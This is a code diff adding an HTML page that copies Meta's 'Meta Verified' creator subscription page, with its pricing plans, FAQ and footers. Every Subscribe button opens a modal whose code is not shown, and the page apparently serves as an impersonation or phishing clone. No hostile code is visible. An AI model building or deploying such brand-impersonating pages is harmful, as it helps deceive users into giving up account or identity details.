+                <p class='text-[12px] text-[#8a8d91] md:order-3 order-4 mb-6'>Eligibility and subscription renewal terms apply. Cancel at any time.</p>
+                <div class='md:order-5 order-3 flex gap-3 flex-wrap mb-6'>
+                    <button onclick="openClientModal()" class='bg-[#0866ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full font-[600] text-[15px] hover:bg-[#0756d6] transition-colors'>Subscribe on Facebook</button>
+                    <button onclick="openClientModal()" class='bg-[#0866ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full font-[600] text-[15px] hover:bg-[#0756d6] transition-colors'>Subscribe on Instagram</button>
+                </div>
+                <p class='text-[14px] text-[#1c2b33] order-6'>
+                    <strong>Are you a business?</strong> Get more information on <a href="#" class='text-[#0064E0] underline'>Meta Verified for businesses</a>.
+                </p>
+                <p class='text-[12px] text-[#606770] mt-2 order-7'>Features, availability and pricing may vary by region and app.</p>
+            </div>
+        </div>
+        <!-- RIGHT: Phone card images -->
+        <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[300px] overflow-hidden relative'>
+            <!-- Background gradient -->
+            <img src="https://scontent-atl3-2.xx.fbcdn.net/v/t39.8562-6/559703849_824469613409272_7128199188761634112_n.webp?_nc_cat=100&ccb=1-7&_nc_sid=9a942e&_nc_ohc=nBHbT0x088sQ7kNvwHefcuQ&oh=00_Af4NzzQ0MIqkNXMIFNtzF-JrSk1IEPv6EAwlGc-aOFAnEg&oe=6A0B0A34"
+                 class='w-full h-full object-cover absolute inset-0' alt="gradient backdrop">
+            <!-- Phone cards overlay -->
+            <div class='absolute inset-0 flex items-center justify-center md:justify-start md:pl-16 pb-4'>
+                <!-- Card 1 -->
+                <div class='absolute w-[160px] md:w-[200px] rounded-[18px] overflow-hidden shadow-2xl' style='left:5%;top:12%;transform:rotate(-6deg);z-index:1;height:55%'>
+                    <img src="https://scontent-atl3-1.xx.fbcdn.net/v/t39.8562-6/585364113_2142038159668816_6001143827682797979_n.webp?_nc_cat=106&ccb=1-7&_nc_sid=9a942e&oh=00_Af4l0bVqLTFP3qCNJQhkABlxF8B8DI0HVA5qU0y-a3Hk8A&oe=6A0B1AB7" class='w-full h-full object-cover' alt="creator">
+                </div>
+                <!-- Card 2 center -->
+                <div class='absolute w-[175px] md:w-[215px] rounded-[18px] overflow-hidden shadow-2xl' style='left:26%;top:5%;transform:rotate(2deg);z-index:3;height:65%'>
+                    <img src="https://scontent-atl3-2.xx.fbcdn.net/v/t39.8562-6/585173016_26139186409005414_156244477983467017_n.webp?_nc_cat=100&ccb=1-7&_nc_sid=9a942e&oh=00_Af5IlUqzAiUhTm8yd4AFGwXfblPIPu7wGtJ9p3jgPPyrIg&oe=6A0AF633" class='w-full h-full object-cover' alt="creator">
+                </div>
+                <!-- Card 3 -->
+                <div class='absolute w-[150px] md:w-[185px] rounded-[18px] overflow-hidden shadow-2xl' style='left:50%;top:18%;transform:rotate(7deg);z-index:2;height:52%'>
+                    <img src="https://scontent-atl3-3.xx.fbcdn.net/v/t39.8562-6/557936526_776878985252326_3217153676007406840_n.webp?_nc_cat=111&ccb=1-7&_nc_sid=9a942e&oh=00_Af5JrF2HkDL6Hq1mM22Gq1s4Wq2xhQ4IKiyvn0pcMxbUNA&oe=6A0B21D5" class='w-full h-full object-cover' alt="creator">
+                </div>
+                <!-- Big blue badge -->
+                <div class='absolute z-10 w-[70px] h-[70px] md:w-[88px] md:h-[88px] bg-[#0866ff] rounded-full flex items-center justify-center shadow-xl' style='left:33%;top:2%'>
+                    <svg viewBox="0 0 24 24" class='w-[38px] h-[38px] md:w-[48px] md:h-[48px]' fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                </div>
+                <!-- Profile bubble -->
+                <div class='absolute z-10 bg-white rounded-[10px] px-3 py-1.5 flex items-center gap-2 shadow-lg' style='left:2%;top:10%'>
+                    <div class='w-6 h-6 rounded-full bg-gradient-to-br from-yellow-400 to-pink-500'></div>
+                    <span class='text-[11px] font-bold text-[#1c1e21]'>Marie Abbott</span>
+                    <div class='w-3 h-3 bg-[#0866ff] rounded-full flex items-center justify-center'><svg viewBox="0 0 24 24" class='w-2 h-2' fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== TRUSTED / INTRO ===== -->
+    <div class='max-w-[1504px] mx-auto flex items-center justify-start md:py-[60px] py-[40px] md:px-[48px] px-6'>
+        <div class='md:max-w-[83%] max-w-full'>
+            <p class='text-[32px] font-[500] text-[#1c1e21]'>A creator toolkit to take your brand further</p>
+            <p class='text-[16px] mt-[18px] font-[300] text-[#1c2b33]'>Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.</p>
+        </div>
+    </div>
+
+    <!-- ===== FEATURES (credibility-style section) ===== -->
+    <div>
+        <div class='font-arial max-w-[1504px] mx-auto md:px-[48px] px-6 md:py-[60px] py-12'>
+            <div class='hidden md:flex flex-row items-center justify-between gap-20'>
+                <div class='w-1/2 relative aspect-[1/1] overflow-hidden rounded-2xl'>
+                    <div class="feature-image absolute inset-0 opacity-100" data-index="0">
+                        <img src="https://scontent-atl3-3.xx.fbcdn.net/v/t39.8562-6/558163525_1121943020107927_8307754257490438721_n.webp?_nc_cat=111&ccb=1-7&_nc_sid=9a942e&oh=00_Af4cKHpJxl8SVy-mh9utZzveG8a4wXDDEx2i8w385So3lg&oe=6A0B201A" class='w-full h-full object-cover' alt="Verified badge" />
+                    </div>
+                    <div class="feature-image absolute inset-0 opacity-0 pointer-events-none" data-index="1">
+                        <img src="https://scontent-atl3-2.xx.fbcdn.net/v/t39.8562-6/583767498_1682946245995766_6520557936593639819_n.webp?_nc_cat=100&ccb=1-7&_nc_sid=9a942e&oh=00_Af53sC-ZtYqb2IOuUmNK6a2PjKkMl4MUJXIaFSJmcXa5yw&oe=6A0AFF22" class='w-full h-full object-cover' alt="Impersonation protection" />
+                    </div>
+                    <div class="feature-image absolute inset-0 opacity-0 pointer-events-none" data-index="2">
+                        <img src="https://scontent-atl3-2.xx.fbcdn.net/v/t39.8562-6/560163465_1327891072158221_3087936622761026736_n.webp?_nc_cat=100&ccb=1-7&_nc_sid=9a942e&oh=00_Af7JGn8tAmb5y-C3b6QKz9fVs0A4PcAqeEbRcqUTM6jd3g&oe=6A0AF7B2" class='w-full h-full object-cover' alt="Enhanced support" />
+                    </div>
+                    <div class="feature-image absolute inset-0 opacity-0 pointer-events-none" data-index="3">
+                        <img src="https://scontent-atl3-3.xx.fbcdn.net/v/t39.8562-6/569017556_1379011433815028_6632732990196602499_n.png?_nc_cat=111&ccb=1-7&_nc_sid=9a942e&oh=00_Af4l6XCJjFcPLU7BVCHLHl8P_qQ0K2yLAh2zY95oZ9j0TQ&oe=6A0AF8C3" class='w-full h-full object-cover' alt="Upgraded features" />
+                    </div>
+                </div>
+                <div class='w-1/2 flex flex-col'>
+                    <div class='feature-item py-10 border-t border-gray-100 cursor-pointer first:border-t-0' data-index="0">
+                        <h3 class='text-[32px] font-[400] text-[#1C2B33]'>Verified badge</h3>
+                        <div class='feature-description overflow-hidden max-h-[200px] opacity-100 mt-6'>
+                            <p class='text-[16px] text-[#1C2B33]'>The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.</p>
+                        </div>
+                    </div>
+                    <div class='feature-item py-10 border-t border-gray-100 cursor-pointer' data-index="1">
+                        <h3 class='text-[32px] font-[400] text-[#1C2B33]'>Impersonation protection</h3>
+                        <div class='feature-description overflow-hidden max-h-0 opacity-0'>
+                            <p class='text-[16px] text-[#1C2B33]'>Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.</p>
+                        </div>
+                    </div>
+                    <div class='feature-item py-10 border-t border-gray-100 cursor-pointer' data-index="2">
+                        <h3 class='text-[32px] font-[400] text-[#1C2B33]'>Enhanced support</h3>
+                        <div class='feature-description overflow-hidden max-h-0 opacity-0'>
+                            <p class='text-[16px] text-[#1C2B33]'>Get 24/7 access to email or chat agent support to help resolve your issues more quickly.</p>
+                        </div>
+                    </div>
+                    <div class='feature-item py-10 border-t border-gray-100 cursor-pointer' data-index="3">
+                        <h3 class='text-[32px] font-[400] text-[#1C2B33]'>Upgraded profile features</h3>
+                        <div class='feature-description overflow-hidden max-h-0 opacity-0'>
+                            <p class='text-[16px] text-[#1C2B33]'>Enrich your profile by adding images to your links to help boost engagement.</p>
+                        </div>
+                    </div>
+                    <div class='border-t border-gray-100'></div>
+                </div>
+            </div>
+            <!-- Mobile -->
+            <div class='md:hidden flex flex-col gap-10'>
+                <div class='flex flex-col gap-4'>
+                    <div class='aspect-video overflow-hidden rounded-xl'><img src="https://scontent-atl3-3.xx.fbcdn.net/v/t39.8562-6/558163525_1121943020107927_8307754257490438721_n.webp?_nc_cat=111&ccb=1-7&_nc_sid=9a942e&oh=00_Af4cKHpJxl8SVy-mh9utZzveG8a4wXDDEx2i8w385So3lg&oe=6A0B201A" class='w-full h-full object-cover' alt="Verified badge"></div>
+                    <h3 class='text-[28px] font-[400] text-[#1C2B33]'>Verified badge</h3>
+                    <p class='text-[16px] text-[#1C2B33]'>The badge means that your profile was verified by Meta based on your activity or documents you provided.</p>
+                </div>
+                <div class='flex flex-col gap-4'>
+                    <div class='aspect-video overflow-hidden rounded-xl'><img src="https://scontent-atl3-2.xx.fbcdn.net/v/t39.8562-6/583767498_1682946245995766_6520557936593639819_n.webp?_nc_cat=100&ccb=1-7&_nc_sid=9a942e&oh=00_Af53sC-ZtYqb2IOuUmNK6a2PjKkMl4MUJXIaFSJmcXa5yw&oe=6A0AFF22" class='w-full h-full object-cover' alt="Protection"></div>
+                    <h3 class='text-[28px] font-[400] text-[#1C2B33]'>Impersonation protection</h3>
+                    <p class='text-[16px] text-[#1C2B33]'>Protect your brand with proactive impersonation monitoring. Meta will remove accounts pretending to be you.</p>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                var featureItems = document.querySelectorAll('.feature-item');
+                var featureImages = document.querySelectorAll('.feature-image');
+                var featureDescs = document.querySelectorAll('.feature-description');
+                featureItems.forEach(function(item) {
+                    item.addEventListener('mouseenter', function() {
+                        var idx = item.getAttribute('data-index');
+                        featureImages.forEach(function(img) {
+                            if (img.getAttribute('data-index') === idx) {
+                                img.classList.remove('opacity-0','pointer-events-none');
+                                img.classList.add('opacity-100');
+                            } else {
+                                img.classList.remove('opacity-100');
+                                img.classList.add('opacity-0','pointer-events-none');
+                            }
+                        });
+                        featureDescs.forEach(function(desc) {
+                            var pIdx = desc.closest('.feature-item').getAttribute('data-index');
+                            if (pIdx === idx) {
+                                desc.classList.remove('max-h-0','opacity-0');
+                                desc.classList.add('max-h-[200px]','opacity-100','mt-6');
+                            } else {
+                                desc.classList.remove('max-h-[200px]','opacity-100','mt-6');
+                                desc.classList.add('max-h-0','opacity-0');
+                            }
+                        });
+                    });
+                });
+            });
+        </script>
+    </div>
+
+    <!-- ===== PLANS & PRICING (using benefits card layout) ===== -->
+    <div class="bg-[#f5f6f6] bg-cover bg-center bg-no-repeat py-20 mb-10">
+        <div class='max-w-[1504px] mx-auto md:px-[32px] px-4'>
+            <h2 class='md:text-[36px] text-[28px] font-[500] text-[#1C2B33] leading-[1.2] mb-4'>Creator plans and pricing</h2>
+            <p class='text-[16px] text-[#5D6C7B] mb-10 max-w-[700px]'>Get these benefits on Facebook and Instagram. Sign up for Meta Verified Standard on web for a discounted price.</p>
+        </div>
+        <div class='max-w-[1504px] mx-auto md:px-[32px] pt-[10px]'>
+            <div class='flex flex-wrap'>
+                <!-- Standard -->
+                <div class='w-full md:w-1/2 lg:w-1/4 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <p class='text-[13px] font-[700] text-[#606770] mb-2'>Standard</p>
+                        <h3 class='md:text-[28px] text-[22px] text-[#0A1317] font-[700] md:mb-4 mb-3'>$14.99<span class='text-[16px] font-[400]'>/month</span></h3>
+                        <p class='text-[13px] text-[#5D6C7B] mb-4'>per profile</p>
+                        <div class='flex-grow'>
+                            <p class='text-[14px] font-[600] text-[#1C2B33] mb-2'>Inspire confidence</p>
+                            <ul class='text-[14px] text-[#5D6C7B] space-y-1 mb-4'>
+                                <li>✓ Verified badge</li>
+                                <li>✓ Impersonation protection</li>
+                                <li>✓ Chat or email with agents 24/7</li>
+                            </ul>
+                        </div>
+                        <button onclick="openClientModal()" class='mt-4 bg-[#0062ff] text-white h-[42px] rounded-full font-[600] text-[14px] hover:bg-[#0052c5] transition-colors'>Subscribe</button>
+                    </div>
+                </div>
+                <!-- Plus -->
+                <div class='w-full md:w-1/2 lg:w-1/4 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border-2 border-[#0866ff] h-full flex flex-col relative'>
+                        <div class='absolute -top-3 left-1/2 -translate-x-1/2 bg-[#0866ff] text-white text-[11px] font-[700] px-3 py-1 rounded-full'>Popular</div>
+                        <p class='text-[13px] font-[700] text-[#0866ff] mb-2'>Plus</p>
+                        <h3 class='md:text-[28px] text-[22px] text-[#0A1317] font-[700] md:mb-4 mb-3'>$49.99<span class='text-[16px] font-[400]'>/month</span></h3>
+                        <p class='text-[13px] text-[#5D6C7B] mb-4'>per profile</p>
+                        <div class='flex-grow'>
+                            <p class='text-[14px] font-[600] text-[#1C2B33] mb-2'>Maximise discovery</p>
+                            <ul class='text-[14px] text-[#5D6C7B] space-y-1 mb-4'>
+                                <li>✓ Everything in Standard</li>
+                                <li>✓ Search optimisation</li>
+                                <li>✓ Featured profile</li>
+                                <li>✓ Links in reels (2/month)</li>
+                            </ul>
+                        </div>
+                        <button onclick="openClientModal()" class='mt-4 bg-[#0062ff] text-white h-[42px] rounded-full font-[600] text-[14px] hover:bg-[#0052c5] transition-colors'>Subscribe</button>
+                    </div>
+                </div>
+                <!-- Premium -->
+                <div class='w-full md:w-1/2 lg:w-1/4 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <p class='text-[13px] font-[700] text-[#606770] mb-2'>Premium</p>
+                        <h3 class='md:text-[28px] text-[22px] text-[#0A1317] font-[700] md:mb-4 mb-3'>$149.99<span class='text-[16px] font-[400]'>/month</span></h3>
+                        <p class='text-[13px] text-[#5D6C7B] mb-4'>per profile</p>
+                        <div class='flex-grow'>
+                            <p class='text-[14px] font-[600] text-[#1C2B33] mb-2'>Drive engagement</p>
+                            <ul class='text-[14px] text-[#5D6C7B] space-y-1 mb-4'>
+                                <li>✓ Everything in Plus</li>
+                                <li>✓ Add images to your links</li>
+                                <li>✓ Exclusive stickers</li>
+                                <li>✓ Custom chat themes</li>
+                            </ul>
+                        </div>
+                        <button onclick="openClientModal()" class='mt-4 bg-[#0062ff] text-white h-[42px] rounded-full font-[600] text-[14px] hover:bg-[#0052c5] transition-colors'>Subscribe</button>
+                    </div>
+                </div>
+                <!-- Max -->
+                <div class='w-full md:w-1/2 lg:w-1/4 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <p class='text-[13px] font-[700] text-[#606770] mb-2'>Max</p>
+                        <h3 class='md:text-[28px] text-[22px] text-[#0A1317] font-[700] md:mb-4 mb-3'>$499.99<span class='text-[16px] font-[400]'>/month</span></h3>
+                        <p class='text-[13px] text-[#5D6C7B] mb-4'>per profile</p>
+                        <div class='flex-grow'>
+                            <p class='text-[14px] font-[600] text-[#1C2B33] mb-2'>Full suite</p>
+                            <ul class='text-[14px] text-[#5D6C7B] space-y-1 mb-4'>
+                                <li>✓ Everything in Premium</li>
+                                <li>✓ Request a call from an agent</li>
+                                <li>✓ Active case monitoring</li>
+                                <li>✓ Personalised content strategy</li>
+                            </ul>
+                        </div>
+                        <button onclick="openClientModal()" class='mt-4 bg-[#0062ff] text-white h-[42px] rounded-full font-[600] text-[14px] hover:bg-[#0052c5] transition-colors'>Subscribe</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== TESTIMONIAL ===== -->
+    <div class="max-w-[1504px] mx-auto px-6 mb-[80px]">
+        <p class="text-center md:text-[32px] font-[500] text-[24px] mb-10">See how Meta Verified has helped real businesses.</p>
+        <div class="bg-[#f1f4f7] overflow-hidden rounded-[24px]" id="testimonial-wrapper">
+            <div class="flex" id="testimonial-track">
+                <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                    <div class="text-center flex flex-col justify-center items-center">
+                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">"Meta Verified helped my account stand out from impersonators, which helped me secure more paying clients."</p>
+                        <p class="md:text-[18px] text-[15px] font-[400]">@inversionista_gal · 4K+ followers</p>
+                    </div>
+                </div>
+                <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                    <div class="text-center flex flex-col justify-center items-center">
+                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust."</p>
+                        <p class="md:text-[18px] text-[15px] font-[400]">Kimber Greenwood, Owner of Water Bear Photography</p>
+                    </div>
+                </div>
+                <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                    <div class="text-center flex flex-col justify-center items-center">
+                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">"Since subscribing, I've noticed a real difference. My posts are getting more reach, engagement has gone up and I'm seeing more interactions on stories and reels."</p>
+                        <p class="md:text-[18px] text-[15px] font-[400]">Devon Kirby, Owner, Mom Approved Miami</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="flex items-center justify-center gap-8 mt-6">
+            <button id="prev-feed" class="w-[32px] h-[32px] md:block hidden text-2xl">←</button>
+            <div class="flex gap-2" id="dots">
+                <button class="w-[10px] h-[10px] rounded-full bg-gray-900"></button>
+                <button class="w-[10px] h-[10px] rounded-full bg-gray-300"></button>
+                <button class="w-[10px] h-[10px] rounded-full bg-gray-300"></button>
+            </div>
+            <button id="next-feed" class="w-[32px] h-[32px] md:block hidden text-2xl">→</button>
+        </div>
+    </div>
+
+    <!-- ===== ACTION / CTA ===== -->
+    <div class='flex md:flex-row flex-col w-full items-center justify-between'>
+        <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[260px] overflow-hidden relative'>
+            <video src="public/images/video-meta.mp4" class='w-full h-full object-cover' autoplay muted loop playsinline></video>
+            <!-- Fallback image if video not found -->
+            <img src="https://scontent-atl3-2.xx.fbcdn.net/v/t39.8562-6/559703849_824469613409272_7128199188761634112_n.webp?_nc_cat=100&ccb=1-7&_nc_sid=9a942e&oh=00_Af4NzzQ0MIqkNXMIFNtzF-JrSk1IEPv6EAwlGc-aOFAnEg&oe=6A0B0A34"
+                 class='w-full h-full object-cover absolute inset-0 -z-10' alt="meta">
+        </div>
+        <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
+            <div class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
+                <div class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px] bg-[#0866ff] rounded-full flex items-center justify-center mb-4'>
+                    <svg viewBox="0 0 24 24" class="md:w-[44px] w-[26px] md:h-[44px] h-[26px]" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                </div>
+                <h1 class='md:text-[48px] text-[32px] font-[700] mb-4 order-2 text-[#1c1e21]'>Ready to become Meta Verified?</h1>
+                <button onclick="openClientModal()" class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px] hover:bg-[#0052c5] transition-colors'>Subscribe now</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== FAQ ===== -->
+    <div class="faq max-w-[1504px] mx-auto mt-20 mb-[80px] px-6">
+        <p class="text-[32px] font-[500] mb-3">FAQ</p>
+        <p class="text-[18px] font-[500] mb-10 text-[#1c2b33]">We've included some frequently asked questions below. For more, visit our Help Centre on
+            <a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://www.facebook.com/business/help/2876154822522394">Facebook</a> or
+            <a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://help.instagram.com">Instagram</a>.
+        </p>
+        <div class="divide-y border-t border-b">
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span class="md:text-[24px] text-[20px]">How do I know if I'm eligible?</span>
+                    <span class="faq-icon transition-transform text-2xl text-gray-400">+</span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        Meta Verified is available in selected regions for creators who meet certain eligibility requirements. Requirements vary by platform — check Facebook and Instagram help centres for details.
+                    </div>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span class="md:text-[24px] text-[20px]">I already have a verified badge. What happens to it?</span>
+                    <span class="faq-icon transition-transform text-2xl text-gray-400">+</span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        There will be no changes to accounts on Facebook or Instagram that are already verified based on prior requirements. Existing verified badge holders can also apply for a Meta Verified subscription if they meet the eligibility requirements.
+                    </div>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span class="md:text-[24px] text-[20px]">What is the verification process?</span>
+                    <span class="faq-icon transition-transform text-2xl text-gray-400">+</span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        You may be asked to provide a government-issued ID and, in selected regions, may be asked to submit a selfie video so that we can confirm your identity before being approved for a Meta Verified subscription.
+                    </div>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span class="md:text-[24px] text-[20px]">As a creator, can I use one Meta Verified subscription on both Facebook and Instagram?</span>
+                    <span class="faq-icon transition-transform text-2xl text-gray-400">+</span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        Yes. If you have your Facebook and Instagram accounts linked in the Accounts Centre, you may be eligible to subscribe to Meta Verified for two profiles for a discounted price.
+                    </div>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span class="md:text-[24px] text-[20px]">What is the price to subscribe to Meta Verified for creators?</span>
+                    <span class="faq-icon transition-transform text-2xl text-gray-400">+</span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        Meta Verified subscriptions are generally available in most regions for USD 11.99 when you subscribe from the web and USD 14.99 when you subscribe within the app for the Standard plan. Other plans: USD 49.99/month for Plus, USD 149.99/month for Premium, USD 499.99/month for Max.
+                    </div>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span class="md:text-[24px] text-[20px]">After I've signed up for Meta Verified, can I change my plan selection?</span>
+                    <span class="faq-icon transition-transform text-2xl text-gray-400">+</span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        Yes. You can change your plan selection at any time on the management screen for your Meta Verified subscription. Note: To upgrade to the Plus, Premium and Max plans, you will need to use your Instagram or Facebook apps on your mobile device.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="bg-[#1b2a34] text-white">
+        <div class="max-w-[1504px] mx-auto py-20 mt-20 px-6 grid grid-cols-1 lg:grid-cols-2 gap-10 items-start">
+            <div>
+                <h2 class="text-3xl font-semibold leading-snug mb-4">Get the latest updates from Meta.</h2>
+                <p class="text-gray-300 max-w-md">Provide your email address to receive the latest updates from Meta, including news, events and product updates.</p>
+            </div>
+            <div class="w-full max-w-xl">
+                <div class="flex flex-col md:flex-row gap-4 mb-4">
+                    <input type="email" placeholder="Email address" class="w-full px-4 py-3 rounded-lg text-black outline-none text-[#465a69] text-[16px]" />
+                    <input type="text" placeholder="Enter a country name..." class="w-full px-4 py-3 rounded-lg text-black outline-none text-[#465a69] text-[16px]" />
+                </div>
+                <p class="text-xs text-gray-300 leading-relaxed mb-4">By submitting this form, you agree to receive marketing related electronic communications from Meta. You may withdraw your consent at any time.</p>
+                <button class='bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full font-[600] text-[15px] hover:bg-[#0052c5] transition-colors'>Subscribe</button>
+            </div>
+        </div>
+        <div class="border-t border-white/20"></div>
+    </footer>
+
+    <!-- FOOTER 2 -->
+    <footer class="bg-[#1b2a34] text-gray-400">
+        <div class="max-w-[1504px] mx-auto py-16 px-6">
+            <div class="hidden md:grid md:grid-cols-3 lg:grid-cols-4 gap-x-8 gap-y-12">
+                <div>
+                    <h3 class="text-[#cbd2d9] text-[16px] mb-4 font-[500]">Meta technologies</h3>
+                    <ul class="space-y-3">
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Facebook</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Messenger</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">WhatsApp</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Meta Quest</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-[#cbd2d9] text-[16px] mb-4 font-[500]">Meta Verified</h3>
+                    <ul class="space-y-3">
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Creators</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Businesses</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Pricing plans</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">FAQ</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-[#cbd2d9] text-[16px] mb-4 font-[500]">About</h3>
+                    <ul class="space-y-3">
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">About Meta</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Newsroom</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Careers</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">For investors</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-[#cbd2d9] text-[16px] mb-4 font-[500]">Support</h3>
+                    <ul class="space-y-3">
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Meta Help Centre</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Facebook Help Centre</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram Help Centre</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">WhatsApp Help Centre</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="border-t border-[#465A69] pt-12 text-sm mt-12">
+                <div class="flex flex-col md:flex-row sm:justify-between sm:items-start gap-6">
+                    <div class="text-[#cbd2d9] text-[13px]">© 2026 Meta</div>
+                    <div class="flex flex-wrap gap-x-6 gap-y-2">
+                        <a href="#" class="text-[#cbd2d9] text-[13px]">Privacy Policy</a>
+                        <a href="#" class="text-[#cbd2d9] text-[13px]">Terms</a>
+                        <a href="#" class="text-[#cbd2d9] text-[13px]">Cookie policy</a>
+                        <a href="#" class="text-[#cbd2d9] text-[13px]">Community Standards</a>
+                        <a href="#" class="text-[#cbd2d9] text-[13px]">Help Centre</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
+
+    <!-- Testimonial JS -->
+    <script>
+    (function() {
+        var track = document.getElementById('testimonial-track');
+        var dots = document.querySelectorAll('#dots button');
+        var prev = document.getElementById('prev-feed');
+        var next = document.getElementById('next-feed');
+        var total = dots.length, cur = 0;
+        function goTo(idx) {
+            cur = (idx + total) % total;
+            track.style.transform = 'translateX(-' + (cur * 100) + '%)';
+            dots.forEach(function(d, i) {
+                d.classList.toggle('bg-gray-900', i === cur);
+                d.classList.toggle('bg-gray-300', i !== cur);
+            });
+        }
+        prev.addEventListener('click', function() { goTo(cur - 1); });
